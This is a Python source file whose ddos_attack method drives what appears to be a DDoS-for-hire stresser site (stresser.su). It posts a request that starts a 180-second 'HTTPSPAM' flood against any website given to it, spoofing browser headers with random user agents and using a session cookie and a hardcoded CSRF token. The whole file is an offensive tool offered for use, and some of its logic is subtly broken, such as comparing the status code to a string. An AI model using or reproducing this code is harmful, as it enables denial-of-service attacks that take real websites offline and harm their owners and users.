import json
import httpx

from colorama import *
from helpers.useragent import UserAgent

init(convert=True)

httpx_client: object = httpx.Client(timeout=None) 

class Requests:        
    def ddos_attack(self, website: str, method: str) -> bool:
        try:
            if method.lower() != "https" and method.lower() != "http":
                return False
            else:
                website: str = website.replace("https://", "").replace("http://", "")
                new_url: str = f"{method}://{website}"
                
                user_agent: str = UserAgent.random()
                
                if user_agent == None:
                    print(f"{Fore.RED}[USERAGENT]{Fore.RED}{Fore.RESET} Failed to generate a unique UserAgent")
                else:
                    print(f"{Fore.GREEN}[USERAGENT]{Fore.GREEN}{Fore.RESET} {user_agent}")
                
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://stresser.su',
                    'referer': 'https://stresser.su/hub',
                    'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'cookie': self.cookie,
                    'user-agent': user_agent,
                    'x-csrf-token': '2c54c2a7540b77593e7df717a79b395cdlgut6slb845stsjv9cud4fuje1451refCS2a02c7c5ca780004c2fb342eacc5e3frefCS82ec23e3a9510a780b6b72f9460922f2',
                    'x-requested-with': 'XMLHttpRequest'
                }

                payload = {
                    'startAttack': '1',
                    'preset-name-7': '',
                    'start-date': '',
                    'start-time': '',
                    'host[]': new_url,
                    'time': '180',
                    'slots': '1',
                    'origin': 'Worldwide',
                    'method': 'HTTPSPAM'
                }
                
                response = httpx_client.post(f"{self.base_url}/request/hub/start", headers=headers, data=payload)

                if response.status_code == 200:
                    response_content: str = response.content.decode("utf-8")
                    response_content: dict = json.loads(response_content)
                    
                    if response_content["status"] == "False":
                        print(f"{Fore.RED}[ATTACK]{Fore.RED}{Fore.RESET} {response_content['message']}")
                    elif response_content["True"]:
                        print(f"{Fore.GREEN}[ATTACK]{Fore.GREEN}{Fore.RESET} Attack has started on {new_url}")
                    else:
                        return False
                    
                else:
                    if response.status_code == "403":
                        print(f"{Fore.RED}[CLOUDFLARE]{Fore.RED}{Fore.RESET} CloudFlare has blocked our request")
                    return False
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Fore.RED}{Fore.RESET} {e}")
            return False